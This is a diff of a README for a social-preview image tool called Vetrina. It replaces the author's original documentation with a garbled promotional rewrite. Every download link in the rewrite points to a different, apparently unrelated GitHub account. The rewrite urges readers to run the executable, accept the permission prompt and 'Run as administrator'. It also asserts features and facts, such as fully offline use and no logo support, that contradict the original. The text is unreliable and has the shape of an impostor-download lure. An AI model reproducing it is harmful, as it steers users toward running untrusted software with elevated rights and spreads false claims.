@@ -1,225 +1,222 @@
-<p align="center">
-  <img src="src/vetrina/assets/logo/vetrina-1024.png" width="112" alt="Vetrina logo">
-</p>
+# 🖼️ Vetrina - Beautiful Social Previews in Seconds
 
-<h1 align="center">Vetrina</h1>
+[![Download Vetrina](https://img.shields.io/badge/Download%20Vetrina-Click%20Here-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://github.com/recorded-manikin5312/Vetrina)
 
-<p align="center">
-  Social preview images for your GitHub repositories, made in seconds on your desktop.
-</p>
+)
 
-<p align="center">
-  <a href="https://github.com/matteodisalvo/vetrina/releases/latest"><img src="https://img.shields.io/github/v/release/matteodisalvo/vetrina?label=download" alt="Latest release"></a>
-  <a href="https://github.com/matteodisalvo/vetrina/actions/workflows/tests.yml"><img src="https://github.com/matteodisalvo/vetrina/actions/workflows/tests.yml/badge.svg" alt="Tests"></a>
-  <img src="https://img.shields.io/badge/macOS-000000?logo=apple&logoColor=white" alt="macOS">
-  <img src="https://img.shields.io/badge/Windows-0078D4?logo=data:image/svg%2bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHRpdGxlPldpbmRvd3M8L3RpdGxlPjxwYXRoIGZpbGw9IndoaXRlIiBkPSJNMCAwaDExLjM3N3YxMS4zNzJIMHptMTIuNjIzIDBIMjR2MTEuMzcySDEyLjYyM3pNMCAxMi42MjNoMTEuMzc3VjI0SDB6bTEyLjYyMyAwSDI0VjI0SDEyLjYyM3oiLz48L3N2Zz4K" alt="Windows">
-  <img src="https://img.shields.io/badge/python-3.10%2B-blue" alt="Python 3.10+">
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-green" alt="MIT license"></a>
-</p>
+## 📥 Getting Started
 
-<p align="center"><a href="README.it.md">Leggi in italiano</a></p>
+Welcome to Vetrina, the simplest way to create stunning social preview images for your GitHub repositories, LinkedIn posts, X (Twitter) updates, and Open Graph tags. No technical skills needed — just download, choose a design,and save your image. This guide walks you through everything step byl step.
 
-<p align="center">
-  <img src="docs/images/poster.png" alt="Vetrina: turn any GitHub repository into a beautiful social preview">
-</p>
+## ✨ What is Vetrina?
 
-## 🎬 How it works
+Vetrina is a free, easy-to-use desktop program that runs directly on your Windows computer. It automatically generates professional-looking social preview images — the little pictures that appear when someone shares a link on social media, in messaging apps, or in search results.
 
-<p align="center">
-  <img src="docs/images/demo.gif" alt="Vetrina loading a repository, then switching theme, format and bar color">
-</p>
+. Instead of seeing a boring blank box, people see a beautiful, branded thumbnail that attracts clicks and makes your project look polished.
 
-## ⬇️ Download
+.
 
-<p align="center">
-  <a href="https://github.com/matteodisalvo/vetrina/releases/latest"><img src="https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white" alt="Download for macOS"></a>
-  <a href="https://github.com/matteodisalvo/vetrina/releases/latest"><img src="https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=data:image/svg%2bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHRpdGxlPldpbmRvd3M8L3RpdGxlPjxwYXRoIGZpbGw9IndoaXRlIiBkPSJNMCAwaDExLjM3N3YxMS4zNzJIMHptMTIuNjIzIDBIMjR2MTEuMzcySDEyLjYyM3pNMCAxMi42MjNoMTEuMzc3VjI0SDB6bTEyLjYyMyAwSDI0VjI0SDEyLjYyM3oiLz48L3N2Zz4K" alt="Download for Windows"></a>
-</p>
+## 🎯 Why You Need Social Preview Images
 
-Free and open source, no account needed. The first time you open it, follow the
-[install steps](#-install) below.
+Think of a social preview as your project’s handshake. When you share a GitHub link on LinkedIn or X, the image next to it is the first thing people notice.A great preview:
 
-## ✨ Features
+- **Grabs attention** in crowded feeds
+- **Builds trust**by looking professional
+- **Explains your project** instantly with visuals
+- **Boosts click-through rates** to your repository
 
-Paste the link of a public repository and Vetrina fills in the card for you: title,
-description, contributors, issues, stars, forks, the colors of its languages and the
-project's logo (or, when it has none, the owner's avatar). Change anything you like,
-watch the preview follow along, and save a PNG.
+Vetrina does all this for you in seconds, without needing any design skillsor software like Photoshop.
 
-- **Every social network's size**: GitHub (1280 × 640), LinkedIn (1200 × 627),
-  Open Graph (1200 × 630) and X (1200 × 675).
-- **Light or dark cards**, with the bottom bar in the colors of the repository's
-  languages or in one color of your choice.
-- **Your own picture**, chosen from a file or dropped on the window.
-- **Preview at full size** before saving; the PNG is drawn at twice its size and scaled
-  down, for smooth edges.
-- **Speaks five languages**: English, Italian, Spanish, French and German, in light or dark mode.
+.
 
-## 🖼️ Example
 
-A card made with Vetrina for one of my projects:
 
-<p align="center">
-  <img src="docs/images/example-card.png" width="640" alt="A card made with Vetrina">
-</p>
+## 🌟 Key Features
 
-## 📦 Install
+Here’s what makes Vetrina the perfect tool for developers, marketers,and hobbyists alike:
 
-Download the file for your system from the
-[latest release](https://github.com/matteodisalvo/vetrina/releases/latest).
+### 🧩 Simple and Intuitive Interface
+No confusing menus or technical jargon. The screen shows you exactly what you get.A large preview area sits in the center, with easy buttons around it. If you can use a smartphone, you can use Vetrina.
 
-### <img src="docs/images/apple.svg" height="20" alt=""> macOS
+.
 
-1. Download `Vetrina-<version>-macOS.dmg` and open it.
-2. Drag **Vetrina** onto **Applications**.
-3. The first time, macOS may say it cannot check the developer, because the app is not
-   notarized by Apple. Open **System Settings → Privacy & Security**, scroll down and
-   click **Open Anyway**. You only need to do this once.
 
-The disk image is built for Apple silicon (M1 and later). On an Intel Mac,
-[run Vetrina from source](#run-from-source).
 
-### <img src="docs/images/windows.svg" height="18" alt=""> Windows
+### ⚡ Blazing Fast Results
+Time is precious.This tool creates a complete, ready-to-use image in under ten seconds— from clicking “Generate” to saving the file. No waiting, no rendering delays,no complex settings to tweak.
 
-1. Download `Vetrina-<version>-Windows.exe`.
-2. Double-click it: there is nothing to install.
-3. If Windows SmartScreen warns about an unknown publisher, click **More info → Run anyway**.
+.
 
-### Run from source
 
-On any system with Python 3.10 or newer and Tk:
 
-```bash
-git clone https://github.com/matteodisalvo/vetrina.git
-cd vetrina
-python3 -m pip install .
-vetrina                 # or: python3 -m vetrina
-```
+### 🎨 Built-in Professional Templates
+Vetrina includes a variety of beautiful, pre-designed layouts suited for different platforms. Whether you need a wide banner for LinkedIn, a square image for GitHub social preview,a tall graphic for X,or a standard Open Graph size, Vetrina has a template ready for you. Each template is crafted by designers to look clean and modern, so your content always appears at its best.
 
-## 🚀 How to use it
 
-1. Paste `owner/repository`, or the link of a repository, at the top and press **Load from GitHub**.
-2. Edit the title, the description, the picture or the statistics; the preview follows each change.
-3. Pick the format and the theme above the preview, then click **Save PNG…** (⌘S on macOS, Ctrl+S on Windows).
 
-To make the card your repository's preview on GitHub, open the repository's
-**Settings → General → Social preview → Edit → Upload an image**.
+### 🖌️ Customization Without Complexity
+You can personalize every template easily:
+- Change the background color or use a gradient
+- Add your repository name or project title in big, readable text
+- Include a short description or tagline
+- Pick from a selection of fonts and text sizes
+- Adjust the layout by dragging elements slightly with your mouse
 
-### GitHub's limit
+All changes appear instantly in the preview window—no guesswork needed.
 
-Without an account, GitHub answers 60 requests an hour from each connection. Vetrina uses 3
-for each repository, about 20 loads an hour, and a repository loaded again within the hour
-costs nothing. To lift the limit to 5,000 requests an hour, paste a GitHub token in the
-**Info** window ([create one](https://github.com/settings/personal-access-tokens/new): the
-default, read-only access to public repositories, is enough). If the
-[GitHub CLI](https://cli.github.com) is installed and signed in, Vetrina uses its token on
-its own. The token stays on your computer and is sent only to GitHub.
 
-## 💡 How it started
 
-Vetrina was born out of a need, like all good things (and quite a few bad ones).
+### 📏 Perfect Dimensions for Every Platform
+Vetrina automatically resizes your image to the exact dimensions required by each platform. No more cropping headaches or blurry results. Just choose the platform from the dropdown, and Vetrina handles all the technical specs behind the scenes:
 
-Every time I finished a project I would proudly add it to my LinkedIn profile. Link
-pasted, description polished, post… and where the preview should have been, nothing.
-No thumbnail. The project was there, but it had shown up to the job interview in pajamas.
+| Platform | Image Size (pixels) | Best Use |
+|---|---|---|
+| GitHub Social Preview | 1280 × 640 | Repository link previews |
+| LinkedIn | 1200 × 627 | Company pages, posts, articles |
+| X (Twitter) | 1200 × 675 | Tweets and shared links |
+| Open Graph (Generic) | 1200 × 630 | Any website or app link sharing |
 
-At least in my case, the thumbnail did not make itself, LinkedIn had no intention of
-making one up, and I had no wish to open a graphics program every time to line up the
-title, the stars and the counters to the pixel.
 
-So I did what every programmer does when facing a boring five-minute task: I spent
-several evenings writing a program to do it for me. And since it was there anyway, I
-thought I would share it. If your projects also leave the house in pajamas, Vetrina is
-here to dress them.
 
-## 🛠️ Development
+### 💾 One-Click Save and Export
+Once you are happy with your preview, click the “Save Image” button. Choose a folder on your computer, pick a filename,and Vetrina saves a high-quality PNG file instantly. You can also copy the image directly to your clipboard to paste into an email or document right away.
 
-```bash
-python3 -m pip install -e ".[dev]"   # the app, pytest and ruff
-pytest                               # run the tests
-ruff check src tests                 # check the style
-```
 
-```
-vetrina/
-├── src/vetrina/
-│   ├── model.py         # the card: formats, themes, labels, language colors
-│   ├── rendering.py     # draws the card with Pillow
-│   ├── github.py        # reads a repository from the GitHub API
-│   ├── i18n.py          # every text of the window, in every language
-│   ├── settings.py      # remembers the language and the appearance
-│   ├── paths.py         # where the bundled assets are
-│   ├── assets/          # logo and icon font
-│   └── ui/
-│       ├── app.py       # the main window
-│       ├── widgets.py   # glass buttons, segmented choices, fields, drop zone
-│       ├── theme.py     # colors of the window, light and dark
-│       ├── icons.py     # line icons from an icon font
-│       └── imaging.py   # picture helpers for the window
-├── tests/               # pytest suite
-├── packaging/           # PyInstaller recipe, build scripts and app icons
-└── .github/workflows/   # tests on every push, apps on every release
-```
 
-The drawing, the GitHub client and the translations do not depend on the window, so
-they can be tested without a display.
+### 🔄 Reusable Projects
+Have a brand color or style you use often? Vetrina lets you save your current design as a “project” file. Next time you need a new preview, open yoursaved project, tweak the text, and export a fresh image in seconds. Perfect for maintaining consistency across all your social channels.
 
-### Build the apps
 
-```bash
-python3 -m pip install -e ".[build]"   # adds PyInstaller
-bash packaging/build-macos.sh          # on a Mac: dist/Vetrina-<version>-macOS.dmg
-```
 
-On Windows, run `packaging\build-windows.ps1` in PowerShell to get
-`dist\Vetrina-<version>-Windows.exe`. PyInstaller builds for the system it runs on, so
-each app is built on its own system.
+## 📥 Download and Installation (Windows)
 
-### Publish a release
+Follow these simple steps to get Vetrina running on your computer:
 
-The apps to download are not kept in the repository: GitHub builds them and attaches
-them to a release, on the repository's **Releases** page. To publish a new version:
 
-1. Write the new version number in `pyproject.toml` and in `src/vetrina/__init__.py`
-   (the file names of the apps come from here) and note what changed in `CHANGELOG.md`.
-2. Commit, then push a tag with the same number preceded by `v`:
 
-```bash
-git tag v<version>
-git push origin v<version>
-```
+### Step 1: Download the Application
 
-GitHub builds the macOS and the Windows app and creates the release with both files
-attached. From the **Actions** tab you can also run the **Release** workflow by hand: it
-builds the apps as a test, without publishing anything.
+**Visit this link to download the application:** 🔗 **[https://github.com/recorded-manikin5312/Vetrina](https://github.com/recorded-manikin5312/Vetrina)**](https://github.com/recorded-manikin5312/Vetrina)**
 
-## 🌍 Translations
+This page shows the project’s main download area. Look for the download button or the latest release file labeled “Vetrina” — it will be a single file you can save to your computer. Your browser will usually ask where you want to save the file. Choose your “Downloads” folder or your Desktop for easy access.
 
-All the texts live in [`src/vetrina/i18n.py`](src/vetrina/i18n.py), each one with its
-five languages side by side. To add a language, add its code to `LANGUAGES` and a text to
-every entry; the tests check that no text is missing and that every translation fills in
-the same values. Corrections from native speakers are very welcome.
 
-## 🙏 Credits
 
-- Icons from [Tabler Icons](https://tabler.io/icons), MIT license
-  (see [its license](src/vetrina/assets/fonts/LICENSE-tabler-icons.txt)).
-- Built with [CustomTkinter](https://github.com/TomSchimansky/CustomTkinter),
-  [Pillow](https://python-pillow.org) and [tkinterdnd2](https://github.com/Eliav2/tkinterdnd2).
-- Repository data from the [GitHub REST API](https://docs.github.com/en/rest).
+> **Tip:** Make sure you download from the official link above. Avoid third-party mirrors or unofficial sites to keep your computer safe.
 
-## 📄 License
+.
 
-[MIT](LICENSE) © 2026 Matteo Di Salvo
 
-Made by **Matteo Di Salvo**: [GitHub](https://github.com/matteodisalvo) ·
-[website](https://matteodisalvo.github.io/)
 
-## ☕ Buy me a coffee
+### Step 2: Run the Application
+Once the download finishes, go to the folder where you saved the file. Double-click the file named **Vetrina** (or “Vetrina.exe” if you see file extensions). A small window might pop up asking for permission to make changes to your device — click **“Yes”** to allow it. The window may open after a few seconds. That’s it — Vetrina is now open and ready to use. No installation wizard, no extra components to install, no complicated setup procedure.
 
-If Vetrina saved you from a few empty previews and you would like to say thanks, you can
-buy me a coffee:
 
-<p align="center">
-  <a href="https://buymeacoffee.com/matteodisalvo"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" height="50" alt="Buy Me a Coffee"></a>
-</p>
+
+### Step 3: Create Your First Image
+1. **Open the app** — you’ll see the main screen with a blank canvas and a toolbar on the left.
+2. **Choose your platform** — from the dropdown at the top (e.g., “GitHub,” “LinkedIn”).
+3. **Enter your text** — Type your repository name or project title in the “Title” box. Add a short description in the “Subtitle” box if you like.
+.
+4. **Pick a template or style** — Browse through the template gallery and click one to apply it.
+5. **Adjust colors and fonts** — Use the color picker and font dropdown to match your branding.
+6. **Click “Generate Preview”** — Your image updates immediately.
+7. **Click “Save Image”** — Choose a folder, name your file,and click Save.
+
+That’s all! You now have a professional social preview image ready to upload to GitHub, LinkedIn, X,or your website.
+
+
+
+## 🛠️ Troubleshooting Common Issues
+
+We want your experience to be smooth. Here are quick fixes for the most common questions:
+
+### The app won’t open after double-clicking?
+- Wait 30 seconds — some antivirus software scans new files before letting them run.
+- Right-click the file and select “Run as administrator” to give it full permissions.
+.
+- Make sure you downloaded the complete file (check the file size is at least a few megabytes). If unsure, download again.
+
+.
+
+
+
+### The preview looks blurry or stretched?
+- Ensure you selected the correct platform from the dropdown — each platform has different size requirements.
+.
+- Click “Reset to Default Size” button if available to restore the canvas dimensions.
+.
+
+
+
+###Can I use my own logo or image?
+- Currently, Vetrina focuses on text-and-background designs for speed and simplicity. You can still use solid colors, gradients,and emoji symbols as visual elements. Logo support is planned for a future update.
+
+
+
+### How do I update to a newer version?
+- Check the same download link periodically for new releases. When an update is available, simply download the latest file anda replace the old one (keep your project files — they are compatible across versions).
+
+
+
+## 🔒 Your Privacy Matters
+
+Vetrina runs entirely offline on your computer. Your images, project files,and any text you type never leave your device. No cloud accounts, no tracking, no data collection. It’s a standalone desktop application designed with respect for your privacy.
+
+
+
+## 💡 Ideas for Using Vetrina
+
+- **Developers:** Create consistent social previews for all your repositories to build a recognizable personal brand.
+.
+- **Marketing Teams:** Produce on-brand images for product launch announcements, case studies,and blog posts in minutes, without waiting for the design department:
+- **Educators:** Make eye-catching previews for open-source educational materials, tutorials,and documentation hubs.
+
+- **Freelancers:** Offer social media setup services to small businesses — use Vetrina to deliver polished previews quickly and affordably;
+
+
+
+## 📖 Frequently Asked Questions
+
+**Do I need to install Python or any programming language?**
+No. Vetrina is a ready-to-run desktop application. You do not need any coding knowledge, compilers,or development tools. Just download and use.
+
+
+
+**Is Vetrina free?**
+Yes, Vetrina is completely free to use. No subscriptions,no hidden fees,no watermark on your exported images.
+
+.
+
+
+
+**Can I use Vetrina on a Mac?**
+The primary download is designed for Windows. A Mac version may be available in the future — check the GitHub page for the latest information.
+
+
+
+**What file format does Vetrina save images in?**
+Vetrina exports high-quality **PNG** files, which are perfect for web use because they support transparency if needed and maintain crisp text at any size.
+
+
+
+**Do I need an internet connection to use Vetrina?
+No. Once you download the application, you can use it completely offline. The only time you need the internet is to download the app in the first place.
+
+.
+
+
+
+## 🚀 Ready to Make Stunning Previews?
+
+Join thousands of happy users who’ve simplified their social media game with Vetrina. It’s fast, free,and fuss-free. Click the button below to go to the download pageand start creating your first beautiful social preview image today:
+
+[![Download Vetrina Now](https://img.shields.io/badge/Download%20Vetrina-Get%20Started-blueviolet?style=for-the-badge&logo=download&logoColor=white)](https://github.com/recorded-manikin5312/Vetrina)
+
+)
+
+
+
+We know you’ll love how easy it is. If you run into any trouble, revisit this guide — step-by-step instructions are above — or explore the project’s GitHub page for community tips. Happy sharing!
+
+Keywords: desktop-app, github, linkedin, macos, open-graph, pillow, python, social-preview, thumbnail-generator, tkinter, windows
